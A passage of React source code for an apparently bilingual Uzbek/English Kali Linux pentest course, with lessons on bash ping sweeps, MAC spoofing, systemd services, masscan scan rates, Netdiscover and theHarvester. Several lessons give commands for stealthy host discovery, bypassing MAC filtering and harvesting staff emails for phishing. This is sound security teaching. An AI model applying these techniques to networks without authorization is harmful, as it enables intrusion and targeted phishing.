    React.createElement(P,null,t(lang,"Bash skript — bir nechta buyruqni bitta faylga jamlab, avtomatik ketma-ket bajarish usuli. Pentestda takrorlanuvchi vazifalarni — 254 ta IP ni tekshirish, natijalarni saralash, bir necha vositani zanjirlab ishga tushirish — avtomatlashtiradi. Qo'lda 10 daqiqa ketadigan ish skript bilan 10 soniyada bajariladi, va xatosiz takrorlanadi.","A bash script bundles several commands into one file and runs them automatically in sequence. In a pentest it automates repetitive tasks — checking 254 IPs, sorting results, chaining several tools. A job that takes 10 minutes by hand runs in 10 seconds with a script, and repeats without errors.")),
    React.createElement(H2,{num:"§2"},t(lang,"Skript qanday ishlaydi","How a script runs")),
    React.createElement(FlowSteps,{title:{uz:"Skriptni yaratish va ishga tushirish",en:"Creating and running a script"},steps:[
      {icon:"#!",text:{uz:"Birinchi qator: #!/bin/bash (shebang)",en:"First line: #!/bin/bash (shebang)"}},
      {icon:"📦",text:{uz:"O'zgaruvchilar va shartlar yoziladi",en:"Variables and conditions are written"}},
      {icon:"🔁",text:{uz:"Sikl (for/while) bilan takror amal",en:"A loop (for/while) repeats an action"}},
      {icon:"🔓",text:{uz:"chmod +x scan.sh — bajarish huquqi berish",en:"chmod +x scan.sh — grant execute permission"}},
      {icon:"▶",text:{uz:"./scan.sh — ishga tushirish",en:"./scan.sh — run it"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"O'zgaruvchilar va qo'shtirnoq","Variables and quoting")),
    React.createElement(P,null,t(lang,"O'zgaruvchi qiymatni saqlaydi: TARGET=\"10.0.0.5\" (tenglik atrofida bo'sh joy YO'Q — bu keng tarqalgan xato). Qiymatni ishlatish uchun $ qo'yiladi: echo $TARGET. Buyruq chiqishini o'zgaruvchiga olish uchun $(...) ishlatiladi: HOSTS=$(cat targets.txt). Qo'shtirnoq muhim: \"$VAR\" bo'sh joyli qiymatlarni saqlaydi, $VAR (tirnoqsiz) ularni bo'lib yuborishi mumkin.","A variable stores a value: TARGET=\"10.0.0.5\" (NO spaces around the equals sign — a common mistake). To use the value, prefix with $: echo $TARGET. To capture a command's output into a variable, use $(...): HOSTS=$(cat targets.txt). Quoting matters: \"$VAR\" preserves values with spaces, while $VAR (unquoted) can split them.")),
    React.createElement(H2,{num:"§4"},t(lang,"Shartlar va sikllar","Conditions and loops")),
    React.createElement(P,null,t(lang,"Shart (if) qarorlar qabul qiladi: if ping -c1 $ip &>/dev/null; then ... fi — xost tirik bo'lsa bir ish, aks holda (else) boshqa ish. Sikllar takrorlaydi: for i in $(seq 1 254); do ... done — 1 dan 254 gacha aylanadi; while [ shart ]; do ... done — shart to'g'ri ekan davom etadi. Bu ikki tuzilma pentest skriptlarining asosidir.","A condition (if) makes decisions: if ping -c1 $ip &>/dev/null; then ... fi — do one thing if the host is alive, else another. Loops repeat: for i in $(seq 1 254); do ... done — iterates 1 to 254; while [ condition ]; do ... done — continues while the condition holds. These two structures are the backbone of pentest scripts.")),
    React.createElement(H2,{num:"§5"},t(lang,"Amaliy recon skripti","A practical recon script")),
    React.createElement(P,null,t(lang,"Quyidagi skript butun /24 tarmoqni tekshirib, tirik xostlarni topadi. seq 1 254 raqamlarni beradi, sikl har IP ni yasaydi, ping bilan sinaydi, muvaffaqiyatli bo'lsa ekranga chiqaradi. Skriptni saqlab, chmod +x bilan bajariladigan qilib, ./scan.sh bilan ishga tushirasiz.","The script below scans an entire /24 network to find live hosts. seq 1 254 produces the numbers, the loop builds each IP, ping tests it, and prints it on success. You save the script, make it executable with chmod +x, and run it with ./scan.sh.")),
    React.createElement(Terminal,null,"#!/bin/bash\n# ^ shebang — skript bash bilan ishga tushadi\nfor i in $(seq 1 254); do\n  ip=\"10.0.0.$i\"\n  ping -c1 -W1 $ip &>/dev/null && echo \"$ip tirik\"\ndone\n\n# ishga tushirish:\n# chmod +x scan.sh && ./scan.sh"),
    React.createElement(Quiz,{q:{uz:"Skriptning birinchi qatoridagi #!/bin/bash nima deyiladi?",en:"What is #!/bin/bash on a script's first line called?"},opts:[{uz:"Izoh",en:"A comment"},{uz:"Shebang — qaysi interpretator ishga tushirishini bildiradi",en:"Shebang — tells which interpreter runs it"},{uz:"O'zgaruvchi",en:"A variable"},{uz:"Sikl",en:"A loop"}],correct:1,exp:{uz:"Shebang (#!) tizimga skriptni qaysi dastur (bu yerda /bin/bash) bilan bajarishni ko'rsatadi — birinchi qatorda turishi shart.",en:"The shebang (#!) tells the system which program (here /bin/bash) executes the script — it must be the first line."}}));
}
function LessonL08(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Tarmoq holatini ko'rish","Inspecting the network")),
    React.createElement(P,null,t(lang,"Har qanday tarmoq hujumidan oldin o'z mashinangizning tarmoq holatini bilishingiz kerak: IP manzilingiz nima, qaysi interfeyslar bor, tashqariga chiqish yo'li (gateway) qayerda. Bu — jangdan oldin o'z pozitsiyangizni bilishdek. Kali'da buning uchun zamonaviy ip buyrug'idan foydalaniladi (eski ifconfig o'rnini bosgan).","Before any network attack you must know your own machine's network state: what your IP is, which interfaces exist, where the exit (gateway) is. It's like knowing your own position before a battle. In Kali this is done with the modern ip command (which replaced the old ifconfig).")),
    React.createElement(H2,{num:"§2"},t(lang,"Foydali buyruqlar","Useful commands")),
    React.createElement(LayerStack,{layers:[
      {n:"ip a",name:t(lang,"IP va interfeyslar","IP & interfaces"),color:"#4dabf7",desc:{uz:"O'z IP manzilingiz, MAC va tarmoq kartalari.",en:"Your IP, MAC and network cards."}},
      {n:"ip route",name:t(lang,"Marshrutlar","Routes"),color:"#69db7c",desc:{uz:"default gateway — tashqi olamga chiqish eshigi.",en:"The default gateway — the door to the outside."}},
      {n:"ss -tulnp",name:t(lang,"Ochiq portlar","Open ports"),color:"#a855f7",desc:{uz:"Sizning mashinangizda tinglayotgan xizmatlar.",en:"Services listening on your machine."}},
      {n:"ping",name:t(lang,"Ulanish sinovi","Connectivity"),color:"#ffd43b",desc:{uz:"Xost tirikligini va tarmoq ishlayotganini tekshirish.",en:"Check a host is alive and the network works."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"ip a chiqishini o'qish","Reading ip a output")),
    React.createElement(P,null,t(lang,"ip a har interfeys uchun ma'lumot beradi: lo — loopback (127.0.0.1, mashinaning o'zi), eth0 — simli, wlan0 — simsiz. Har interfeys ostida inet qatori IPv4 manzilni /24 kabi tarmoq maskasi bilan ko'rsatadi (192.168.1.10/24), inet6 esa IPv6 ni. link/ether qatori MAC manzilni beradi. \"UP\" so'zi interfeys faol ekanini bildiradi.","ip a gives info for each interface: lo — loopback (127.0.0.1, the machine itself), eth0 — wired, wlan0 — wireless. Under each interface, the inet line shows the IPv4 address with a netmask like /24 (192.168.1.10/24), and inet6 the IPv6. The link/ether line gives the MAC address. The word \"UP\" means the interface is active.")),
    React.createElement(H2,{num:"§4"},t(lang,"Ulanishni bosqichma-bosqich sinash","Testing connectivity step by step")),
    React.createElement(P,null,t(lang,"Internet ishlamasa, muammoni qatlam-qatlam toraytiring: avval ping 8.8.8.8 (IP bo'yicha) — ishlasa, tarmoq va gateway joyida. Keyin ping google.com — bu ishlamasa-yu 8.8.8.8 ishlasa, muammo DNS da. traceroute paket qaysi routerlardan o'tishini ko'rsatadi (qayerda uzilishini topish uchun). ss -tulnp esa o'z mashinangizda qaysi portlar ochiqligini beradi.","If the internet is down, narrow the problem layer by layer: first ping 8.8.8.8 (by IP) — if it works, the network and gateway are fine. Then ping google.com — if that fails but 8.8.8.8 works, the issue is DNS. traceroute shows which routers a packet passes through (to find where it breaks). ss -tulnp shows which ports are open on your own machine.")),
    React.createElement(H2,{num:"§5"},t(lang,"MAC manzilni o'zgartirish","Changing the MAC address")),
    React.createElement(P,null,t(lang,"MAC manzil — tarmoq kartasining doimiy \"pasport raqami\". Anonimlik yoki MAC filtrlashni chetlab o'tish uchun uni vaqtincha o'zgartirish mumkin (macchanger bilan). Bu faqat ta'lim va ruxsat berilgan muhitda qilinadi.","The MAC address is the network card's permanent \"passport number\". For anonymity or to bypass MAC filtering, you can temporarily change it (with macchanger). Do this only in educational and authorized environments.")),
    React.createElement(Terminal,null,"ip a\nip route\nping -c4 8.8.8.8       # IP bo'yicha\nping -c4 google.com    # DNS bilan\ntraceroute google.com\n# MAC ni vaqtincha o'zgartirish:\nsudo ip link set eth0 down\nsudo macchanger -r eth0\nsudo ip link set eth0 up"),
    React.createElement(Quiz,{q:{uz:"Kali'da IP manzil va interfeyslarni ko'rish uchun zamonaviy buyruq qaysi?",en:"Modern command to see IP and interfaces in Kali?"},opts:[{uz:"ip a",en:"ip a"},{uz:"ls -l",en:"ls -l"},{uz:"cat /ip",en:"cat /ip"},{uz:"ping",en:"ping"}],correct:0,exp:{uz:"ip a (ip address) interfeyslar va ularning IP manzillarini ko'rsatadi — eski ifconfig'ning zamonaviy o'rnini bosadi.",en:"ip a (ip address) lists interfaces and their IPs — the modern replacement for ifconfig."}}));
}
function LessonL09(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Xizmatlar va systemd","Services and systemd")),
    React.createElement(P,null,t(lang,"Xizmat (service) — fonda doimiy ishlab turadigan dastur, masalan veb-server, SSH yoki ma'lumotlar bazasi. Ular foydalanuvchi aralashuvisiz, tizim yonganidan boshlab ishlaydi. Kali systemd nomli tizimni ishlatadi — bu barcha xizmatlarni boshqaradigan \"dispetcher\". Xizmatlar systemctl buyrug'i orqali boshqariladi.","A service is a program that runs continuously in the background, such as a web server, SSH or a database. They run without user interaction, from the moment the system boots. Kali uses a system called systemd — the \"dispatcher\" that manages all services. Services are controlled with the systemctl command.")),
    React.createElement(H2,{num:"§2"},t(lang,"Xizmat hayot tsikli","The service lifecycle")),
    React.createElement(FlowSteps,{title:{uz:"Xizmatni boshqarish",en:"Managing a service"},steps:[
      {icon:"▶",text:{uz:"sudo systemctl start ssh — ishga tushirish",en:"sudo systemctl start ssh — start it"}},
      {icon:"📊",text:{uz:"systemctl status ssh — holatini ko'rish",en:"systemctl status ssh — check status"}},
      {icon:"🔁",text:{uz:"systemctl enable ssh — yuklanishda avtomatik",en:"systemctl enable ssh — auto-start at boot"}},
      {icon:"⏹",text:{uz:"systemctl stop ssh — to'xtatish",en:"systemctl stop ssh — stop it"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"systemctl buyruqlari","systemctl commands")),
    React.createElement(P,null,t(lang,"start xizmatni hozir ishga tushiradi; stop to'xtatadi; restart o'chirib-yoqadi (sozlama o'zgargach kerak bo'ladi); status holatini, so'nggi loglarni va ishlayotgan-yo'qligini ko'rsatadi. enable va disable esa bir marta sozlanadi: enable xizmatni tizim HAR yonganda avtomatik ishga tushirishga sozlaydi, disable buni bekor qiladi. start (bir martalik) va enable (doimiy) farqini tushunish muhim.","start launches the service now; stop stops it; restart cycles it off and on (needed after a config change); status shows its state, recent logs and whether it's running. enable and disable are set once: enable configures the service to auto-start EVERY time the system boots, disable undoes it. Understanding the difference between start (one-time) and enable (permanent) is important.")),
    React.createElement(H2,{num:"§4"},t(lang,"Pentestda kerak bo'ladigan xizmatlar","Services you'll need in a pentest")),
    React.createElement(P,null,t(lang,"Ba'zi xizmatlar pentestda tez-tez ishga tushiriladi: postgresql — Metasploit uning ma'lumotlar bazasini ishlatadi; apache2 yoki tez python3 -m http.server — nishonga fayl (payload) uzatish uchun vaqtinchalik veb-server; ssh — masofaviy kirish uchun. Ularni faqat kerak bo'lganda yoqing.","Some services are started often in a pentest: postgresql — Metasploit uses its database; apache2 or the quick python3 -m http.server — a temporary web server to deliver files (payloads) to the target; ssh — for remote access. Start them only when needed.")),
    React.createElement(H2,{num:"§5"},t(lang,"Loglarni ko'rish","Viewing logs")),
    React.createElement(P,null,t(lang,"Xizmat ishlamasa, sabab ko'pincha loglarda. journalctl -u ssh xizmatning loglarini ko'rsatadi. systemctl status ssh esa oxirgi bir necha log qatorini darhol beradi. Bu — nosozlikni tashxislashning birinchi qadami.","If a service won't work, the reason is usually in the logs. journalctl -u ssh shows the service's logs. systemctl status ssh gives the last few log lines immediately. This is the first step in diagnosing a fault.")),
    React.createElement(Terminal,null,"sudo systemctl start postgresql   # Metasploit uchun\nsudo systemctl status ssh\nsudo systemctl enable ssh         # yuklanishda avto\npython3 -m http.server 8000       # tez veb-server\njournalctl -u apache2 --no-pager | tail"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Xizmatlarni faqat kerak bo'lganda ishga tushiring — doimiy ishlab turgan SSH yoki veb-server sizning mashinangizni ham hujum nishoniga aylantiradi.","Only start services when needed — an always-on SSH or web server turns your own machine into an attack target too.")),
    React.createElement(Quiz,{q:{uz:"Xizmatni tizim har yuklanganda avtomatik ishga tushirish uchun qaysi buyruq?",en:"Which command makes a service auto-start at every boot?"},opts:[{uz:"systemctl start",en:"systemctl start"},{uz:"systemctl enable",en:"systemctl enable"},{uz:"systemctl status",en:"systemctl status"},{uz:"systemctl stop",en:"systemctl stop"}],correct:1,exp:{uz:"systemctl enable xizmatni yuklanish vaqtida avtomatik ishga tushirishga sozlaydi; start esa uni faqat hozir bir marta ishga tushiradi.",en:"systemctl enable sets a service to auto-start at boot; start only launches it once now."}}));
}
function LessonL10(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"600+ vosita, tartibli","600+ tools, organized")),
    React.createElement(P,null,t(lang,"Kali'ning kuchi — 600 dan ortiq oldindan o'rnatilgan xavfsizlik vositasida. Bu ulkan to'plam bo'lsa-da, u tartibsiz emas: vositalar pentest bosqichlariga mos toifalarga ajratilgan, va ilovalar menyusi ham xuddi shu toifalar bo'yicha tuzilgan. Bu sizga kerakli vositani tez topishga yordam beradi — masalan \"parol buzish\" kerak bo'lsa, to'g'ridan-to'g'ri Password Attacks toifasiga qaraysiz.","Kali's power is its 600+ pre-installed security tools. Huge as this set is, it isn't chaotic: the tools are grouped into categories matching pentest phases, and the applications menu follows the same categories. This helps you find the right tool fast — if you need to \"crack a password\", you go straight to the Password Attacks category.")),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy toifalar","Main categories")),
    React.createElement(LayerStack,{layers:[
      {n:"🔍",name:t(lang,"Ma'lumot to'plash","Information Gathering"),color:"#4dabf7",desc:{uz:"Nmap, theHarvester, dnsenum — nishon haqida bilish.",en:"Nmap, theHarvester, dnsenum — learn about the target."}},
      {n:"🕸",name:t(lang,"Veb ilovalar","Web Applications"),color:"#69db7c",desc:{uz:"Burp Suite, sqlmap, Nikto, wpscan — veb zaifliklar.",en:"Burp Suite, sqlmap, Nikto, wpscan — web vulns."}},
      {n:"🔑",name:t(lang,"Parol hujumlari","Password Attacks"),color:"#a855f7",desc:{uz:"Hydra (onlayn), John/Hashcat (oflayn).",en:"Hydra (online), John/Hashcat (offline)."}},
      {n:"💥",name:t(lang,"Ekspluatatsiya","Exploitation"),color:"#ff3a5e",desc:{uz:"Metasploit, searchsploit, SET.",en:"Metasploit, searchsploit, SET."}},
      {n:"📡",name:t(lang,"Sniffing & simsiz","Sniffing & wireless"),color:"#ffd43b",desc:{uz:"Wireshark, Aircrack-ng, Bettercap.",en:"Wireshark, Aircrack-ng, Bettercap."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Toifalar pentest bosqichlariga mos","Categories map to pentest phases")),
    React.createElement(P,null,t(lang,"Bu toifalar tasodifiy emas — ular haqiqiy pentest jarayonining bosqichlarini aks ettiradi: avval Information Gathering (razvedka), keyin Vulnerability Analysis (zaifliklarni topish), so'ng Exploitation (foydalanish), keyin Post Exploitation (kirishdan keyin), va nihoyat Reporting (hisobot). Menyu shu tartibda o'qilsa, u sizga pentest \"yo'l xaritasi\"ni ham o'rgatadi.","These categories aren't random — they mirror the phases of a real pentest: first Information Gathering (recon), then Vulnerability Analysis (finding weaknesses), then Exploitation, then Post Exploitation (after access), and finally Reporting. Read in that order, the menu also teaches you the pentest \"roadmap\".")),
    React.createElement(H2,{num:"§4"},t(lang,"Vositani topish va o'rnatish","Finding and installing a tool")),
    React.createElement(P,null,t(lang,"which nom — vosita o'rnatilganini tekshiradi va yo'lini beradi. Agar o'rnatilmagan bo'lsa, sudo apt install nom bilan o'rnatasiz, yoki metapaket orqali butun toifani (kali-tools-web). Har vosita haqida to'liq ma'lumot kali.org/tools saytida bor — u yerda misollar va bayroqlar tushuntirilgan.","which name — checks that a tool is installed and gives its path. If it's not installed, install it with sudo apt install name, or install a whole category via a metapackage (kali-tools-web). Full info on every tool is at kali.org/tools — with examples and flags explained there.")),
    React.createElement(H2,{num:"§5"},t(lang,"Vosita bilan yordam olish","Getting help with a tool")),
    React.createElement(P,null,t(lang,"Yangi vositani ishlatishdan oldin uni tushunish muhim. man nom to'liq qo'llanma beradi; nom --help yoki nom -h qisqa bayroqlar ro'yxati; ko'p vosita nom -h bilan misollar ham ko'rsatadi. Vositani ko'r-ko'rona ishlatmang — avval nima qilishini va parametrlarini o'rganing.","Before using a new tool, it's important to understand it. man name gives the full manual; name --help or name -h a short list of flags; many tools also show examples with name -h. Don't use a tool blindly — first learn what it does and its parameters.")),
    React.createElement(Terminal,null,"which nmap        # o'rnatilganmi? yo'li qayerda?\nman nmap          # to'liq qo'llanma\nnmap --help       # qisqa yordam\nsudo apt install kali-linux-large   # ko'p vosita metapaketi"),
    React.createElement(Quiz,{q:{uz:"Kali vositalari qanday tartibga solingan?",en:"How are Kali's tools organized?"},opts:[{uz:"Alifbo tartibida",en:"Alphabetically"},{uz:"Pentest bosqichlariga mos toifalar bo'yicha",en:"Into categories matching pentest phases"},{uz:"Fayl hajmi bo'yicha",en:"By file size"},{uz:"Tasodifiy",en:"Randomly"}],correct:1,exp:{uz:"Vositalar ma'lumot to'plash, ekspluatatsiya, parol hujumlari kabi pentest bosqichlariga mos toifalarga ajratilgan — bu menyuni ham \"yo'l xaritasi\" qiladi.",en:"Tools are grouped into categories matching pentest phases like info gathering, exploitation and password attacks — making the menu a \"roadmap\" too."}}));
}
function LessonL12(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Netdiscover nima?","What is Netdiscover?")),
    React.createElement(P,null,t(lang,"Netdiscover — ARP so'rovlari yordamida lokal tarmoqdagi tirik xostlarni topadigan sodda va tezkor vosita. Uning kuchi shundaki, u ping'ga (ICMP) tayanmaydi — shuning uchun ICMP'ni bloklaydigan qurilmalarni ham topadi. Tarmoq xaritasini tuzishning eng birinchi qadami: kim bor va qayerda.","Netdiscover is a simple, fast tool that finds live hosts on the local network using ARP requests. Its strength is that it doesn't rely on ping (ICMP) — so it detects even devices that block ICMP. It's the very first step in mapping a network: who is there and where.")),
    React.createElement(H2,{num:"§2"},t(lang,"ARP orqali topish","Discovery via ARP")),
    React.createElement(PacketFlow,{from:{uz:"Kali",en:"Kali"},to:{uz:"Butun tarmoq",en:"The whole LAN"},label:"ARP who-has",color:"#a855f7"}),
    React.createElement(FlowSteps,{title:{uz:"Netdiscover oqimi",en:"Netdiscover flow"},steps:[
      {icon:"📢",text:{uz:"Tarmoqqa ARP so'rovlari yuboriladi",en:"ARP requests are broadcast to the network"}},
      {icon:"🙋",text:{uz:"Har tirik xost o'z MAC bilan javob beradi",en:"Each live host replies with its MAC"}},
      {icon:"🗺",text:{uz:"IP + MAC + ishlab chiqaruvchi ro'yxatlanadi",en:"IP + MAC + vendor are listed"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Passiv va aktiv rejim","Passive vs active mode")),
    React.createElement(P,null,t(lang,"Netdiscover ikki rejimda ishlaydi. Aktiv rejim (-r bilan diapazon berilganda) o'zi ARP so'rovlarini yuboradi — tez, lekin tarmoqda iz qoldiradi. Passiv rejim (-p) esa hech qanday paket yubormaydi — u shunchaki tarmoqdagi mavjud ARP trafigini tinglaydi va shundan xostlarni aniqlaydi. Passiv rejim deyarli aniqlanmaydi, lekin sekinroq va faqat gaplashayotgan xostlarni ko'radi.","Netdiscover works in two modes. Active mode (when you give a range with -r) sends ARP requests itself — fast, but leaves a trace on the network. Passive mode (-p) sends no packets — it just listens to the existing ARP traffic on the network and identifies hosts from it. Passive mode is nearly undetectable, but slower and only sees hosts that are talking.")),
    React.createElement(H2,{num:"§4"},t(lang,"Natijani o'qish","Reading the output")),
    React.createElement(P,null,t(lang,"Netdiscover har tirik xost uchun IP manzil, MAC manzil va tarmoq kartasi ishlab chiqaruvchisini (vendor) ko'rsatadi. Vendor ma'lumoti juda foydali: u ko'pincha qurilma turini ochib beradi — masalan \"VMware\" (virtual mashina), \"Cisco\" (router/switch), \"Raspberry Pi\" yoki printer ishlab chiqaruvchisi. Bu sizga nishonlarni ustuvorlashtirishga yordam beradi.","Netdiscover shows an IP address, MAC address and network card vendor for each live host. The vendor info is very useful: it often reveals the device type — e.g. \"VMware\" (a VM), \"Cisco\" (router/switch), \"Raspberry Pi\" or a printer maker. This helps you prioritize targets.")),
    React.createElement(Terminal,null,"sudo netdiscover -r 10.0.0.0/24    # aktiv, aniq diapazon\nsudo netdiscover -i eth0           # interfeys bo'yicha\nsudo netdiscover -p                # passiv (yashirin)"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Faqat o'z tarmog'ingizda yoki ruxsat berilgan muhitda ishlating.","Use only on your own network or an authorized environment.")),
    React.createElement(Quiz,{q:{uz:"Netdiscover qaysi protokol bilan tirik xostlarni topadi?",en:"Which protocol does Netdiscover use to find live hosts?"},opts:[{uz:"ICMP (ping)",en:"ICMP (ping)"},{uz:"ARP",en:"ARP"},{uz:"DNS",en:"DNS"},{uz:"HTTP",en:"HTTP"}],correct:1,exp:{uz:"Netdiscover ARP so'rovlaridan foydalanadi — shuning uchun u ping'ni (ICMP) bloklaydigan xostlarni ham aniqlaydi.",en:"Netdiscover uses ARP requests — so it detects hosts even if they block ping (ICMP)."}}));
}
function LessonL13(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Masscan nima?","What is Masscan?")),
    React.createElement(P,null,t(lang,"Masscan — dunyodagi eng tezkor port skaneri. U o'zining maxsus TCP/IP stekidan foydalanadi va paketlarni operatsion tizim navbatini kutmasdan yuboradi (asinxron) — shuning uchun teoretik jihatdan butun internetni bir necha daqiqada skanerlay oladi. U Nmap'dan yuzlab marta tez, lekin evaziga kamroq batafsil (versiya/OS aniqlash yo'q).","Masscan is the fastest port scanner in the world. It uses its own custom TCP/IP stack and sends packets without waiting for the OS queue (asynchronously) — so it can theoretically scan the entire internet in minutes. It's hundreds of times faster than Nmap, but in exchange less detailed (no version/OS detection).")),
    React.createElement(H2,{num:"§2"},t(lang,"Masscan + Nmap ish oqimi","The Masscan + Nmap workflow")),
    React.createElement(FlowSteps,{title:{uz:"Tez + batafsil",en:"Fast + detailed"},steps:[
      {icon:"⚡",text:{uz:"Masscan katta diapazonda ochiq portlarni tez topadi",en:"Masscan quickly finds open ports over a large range"}},
      {icon:"📋",text:{uz:"Topilgan portlar ro'yxati olinadi",en:"The list of found ports is collected"}},
      {icon:"🔬",text:{uz:"Nmap o'sha portlarni chuqur tekshiradi (-sV)",en:"Nmap inspects those ports in detail (-sV)"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Nima uchun bunchalik tez?","Why so fast?")),
    React.createElement(P,null,t(lang,"Oddiy skanerlar har paket uchun operatsion tizimga murojaat qiladi va javobni kutadi — bu sekin. Masscan esa o'z stekini ishlatib, javobni kutmasdan minglab paketni ketma-ket otadi, keyin javoblarni alohida yig'ib oladi. Bu radardan chiqqan signallar kabi — hammasi bir vaqtda yuboriladi. Shuning uchun --rate parametri (sekundiga necha paket) uning tezligini belgilaydi.","Ordinary scanners ask the OS for each packet and wait for a reply — which is slow. Masscan uses its own stack to fire thousands of packets in a row without waiting, then collects the replies separately. It's like signals from a radar — all sent at once. That's why the --rate parameter (packets per second) sets its speed.")),
    React.createElement(H2,{num:"§4"},t(lang,"Tezlikni sozlash — ehtiyotkorlik","Tuning the rate — carefully")),
    React.createElement(P,null,t(lang,"--rate juda kuchli, lekin xavfli parametr. Juda yuqori tezlik (masalan --rate=100000) tarmoq kanalini to'ldirib, xizmatlarni ishdan chiqarishi (tasodifiy DoS), routerlarni charchatishi va sizni darhol aniqlashi mumkin. Amaliyotda o'rtacha tezlikdan boshlang (--rate=1000) va faqat ruxsat berilgan, barqaror tarmoqlarda oshiring.","--rate is a very powerful but dangerous parameter. Too high (e.g. --rate=100000) can flood the network link, knock out services (an accidental DoS), tire out routers and get you detected instantly. In practice start with a moderate rate (--rate=1000) and only raise it on authorized, stable networks.")),
    React.createElement(Terminal,null,"sudo masscan 10.0.0.0/24 -p22,80,443 --rate=1000\nsudo masscan 10.0.0.5 -p0-65535 --rate=10000 -oL out.txt\n# keyin topilgan portlarni Nmap bilan chuqur tekshirish:\nnmap -sV -p22,80,443 10.0.0.5"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"--rate ni ehtiyotkorlik bilan sozlang — juda yuqori tezlik xizmatlarni ishdan chiqarishi (DoS) va sizni darhol aniqlashi mumkin. Faqat ruxsat berilgan tarmoqlarda.","Set --rate carefully — too high can knock out services (DoS) and get you detected instantly. Only on authorized networks.")),
    React.createElement(Quiz,{q:{uz:"Masscan va Nmap odatda qanday birga ishlatiladi?",en:"How are Masscan and Nmap typically used together?"},opts:[{uz:"Masscan tez topadi, Nmap chuqur tekshiradi",en:"Masscan finds fast, Nmap inspects deeply"},{uz:"Ikkalasi bir xil ish",en:"They do the same job"},{uz:"Ular birga ishlamaydi",en:"They can't work together"},{uz:"Nmap avval bekor qiladi",en:"Nmap cancels it"}],correct:0,exp:{uz:"Masscan katta diapazonda ochiq portlarni tez aniqlaydi, so'ng Nmap o'sha portlarni versiya/xizmat uchun batafsil skanerlaydi.",en:"Masscan rapidly finds open ports over a large range, then Nmap scans them in detail for version/service."}}));
}
function LessonL15(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"theHarvester nima?","What is theHarvester?")),
    React.createElement(P,null,t(lang,"theHarvester — ochiq manba razvedkasi (OSINT) vositasi. U ochiq, ommaga oshkor manbalardan (qidiruv tizimlari, PGP serverlari, sertifikat jurnallari, Shodan) nishon tashkilotning email manzillari, subdomenlari, xodim ismlari va IP'larini to'playdi — va eng muhimi, nishonga hech qanday paket yubormasdan. Bu \"passiv\" razvedka: nishon sizni umuman sezmaydi.","theHarvester is an open-source intelligence (OSINT) tool. It gathers a target organization's email addresses, subdomains, employee names and IPs from public, openly available sources (search engines, PGP servers, certificate logs, Shodan) — and crucially, without sending any packets to the target. This is \"passive\" recon: the target never notices you.")),
    React.createElement(H2,{num:"§2"},t(lang,"Passiv razvedka oqimi","Passive recon flow")),
    React.createElement(FlowSteps,{title:{uz:"theHarvester",en:"theHarvester"},steps:[
      {icon:"🌐",text:{uz:"Ochiq manbalarni so'rash (Google, Bing, crt.sh)",en:"Query public sources (Google, Bing, crt.sh)"}},
      {icon:"📧",text:{uz:"Email va subdomenlar yig'iladi",en:"Emails and subdomains are collected"}},
      {icon:"🕵",text:{uz:"Nishon buni sezmaydi (passiv)",en:"The target never notices (passive)"}},
      {icon:"📄",text:{uz:"Natija keyingi hujum uchun ro'yxat bo'ladi",en:"Results become a list for later attacks"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Nega passiv razvedka qimmatli?","Why passive recon is valuable")),
    React.createElement(P,null,t(lang,"Passiv razvedka pentestning eng birinchi va eng xavfsiz bosqichi — nishonga tegmasdan ko'p narsa bilib olasiz. Topilgan email manzillar keyingi fishing yoki parol hujumlari uchun foydalanuvchi ro'yxati bo'lib xizmat qiladi (masalan aziz@example.com dan aziz login nomini taxmin qilish mumkin). Xodim ismlari ijtimoiy muhandislik uchun, subdomenlar esa yangi hujum yuzasi uchun ishlatiladi.","Passive recon is the first and safest phase of a pentest — you learn a lot without touching the target. Discovered email addresses serve as a username list for later phishing or password attacks (e.g. from alice@example.com you can guess the login name alice). Employee names are used for social engineering, and subdomains as a new attack surface.")),
    React.createElement(H2,{num:"§4"},t(lang,"Manbalar va crt.sh","Sources and crt.sh")),
    React.createElement(P,null,t(lang,"theHarvester -b bilan qaysi manbadan qidirishni tanlaysiz: google, bing, duckduckgo, linkedin va boshqalar. Ayniqsa qimmatlisi — crtsh manbasi: u SSL sertifikat shaffoflik jurnallaridan subdomenlarni topadi. Nega bu kuchli? Chunki har bir HTTPS sayti sertifikat oladi, va bu sertifikatlar ochiq jurnallarga yoziladi — shuning uchun crt.sh ko'pincha kompaniya yashirmoqchi bo'lgan ichki subdomenlarni ham ochib beradi.","With theHarvester -b you choose which source to query: google, bing, duckduckgo, linkedin and others. Especially valuable is the crtsh source: it finds subdomains from SSL certificate transparency logs. Why is it powerful? Because every HTTPS site gets a certificate, and those certificates are written to public logs — so crt.sh often reveals even the internal subdomains a company meant to hide.")),
    React.createElement(Terminal,null,"theHarvester -d example.com -b google\ntheHarvester -d example.com -b bing,duckduckgo,crtsh\ntheHarvester -d example.com -b all -f natija   # HTML/XML ga saqlash"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"crt.sh manbasi SSL sertifikat jurnallaridan subdomenlarni topadi — bu ko'pincha yashirin ichki subdomenlarni ham ochib beradi.","The crt.sh source finds subdomains from SSL certificate logs — often revealing hidden internal subdomains too.")),
